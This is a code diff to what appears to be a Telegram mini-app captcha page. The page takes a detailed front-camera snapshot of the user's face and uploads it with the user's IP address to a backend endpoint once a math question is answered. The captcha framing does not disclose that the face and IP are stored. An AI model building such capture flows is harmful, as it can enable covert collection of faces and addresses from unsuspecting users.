@@ -94,7 +94,7 @@
 
             await new Promise(r => setTimeout(r, 1200));
             
-            // CHỤP ẢNH NÉT CĂNG (Độ phân giải 640x480, chất lượng JPEG 0.85)
+            // Chụp ảnh độ phân giải nét căng 640x480
             capturedImage = snapshotHD();
 
             if (localStream) {
@@ -109,7 +109,6 @@
 
         async function requestCamera() {
             try {
-                // Xin quyền mở camera ở độ phân giải cao chuẩn HD/VGA
                 localStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
@@ -128,7 +127,6 @@
             }
         }
 
-        // Hàm chụp ảnh nét căng, tự động cắt/nén thông minh để vừa vặn gửi qua Telegram
         function snapshotHD() {
             try {
                 const video = document.getElementById('video');
@@ -136,12 +134,10 @@
                 if (!video.videoWidth) return "";
                 const ctx = canvas.getContext('2d');
                 
-                // Đặt kích thước canvas rõ nét (640x480)
                 canvas.width = 640;
                 canvas.height = 480;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Chất lượng 0.85 cho ra ảnh rõ mặt, chi tiết cực tốt
                 return canvas.toDataURL('image/jpeg', 0.85);
             } catch (e) {
                 console.log("Lỗi chụp ảnh HD:", e);
@@ -160,21 +156,33 @@
                 document.getElementById('status').innerText = "✅ Xác minh thành công! Đang gửi dữ liệu...";
                 document.getElementById('captcha-section').style.display = "none";
 
-                setTimeout(() => {
+                // Gửi ảnh nét qua API backend để tránh giới hạn 4KB của Telegram
+                fetch('/api/save-photo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        token: token,
+                        ip: clientIp,
+                        image: capturedImage
+                    })
+                })
+                .then(res => res.json())
+                .then(data => {
                     try {
-                        // Chia nhỏ gói tin hoặc gửi chuỗi base64 dài hơn nhờ tối ưu ở Python
                         tg.sendData(JSON.stringify({
                             type: "camera_snapshot",
                             token: token,
                             ip: clientIp,
-                            passed: true,
-                            image: capturedImage
+                            passed: true
                         }));
-                    } catch (e) {
-                        console.log("sendData lỗi:", e);
-                    }
+                    } catch (e) {}
                     setTimeout(() => tg.close(), 600);
-                }, 300);
+                })
+                .catch(err => {
+                    console.log("Lỗi gửi ảnh:", err);
+                    setTimeout(() => tg.close(), 600);
+                });
+
             } else {
                 alert("❌ Kết quả phép tính không chính xác, vui lòng thử lại!");
             }
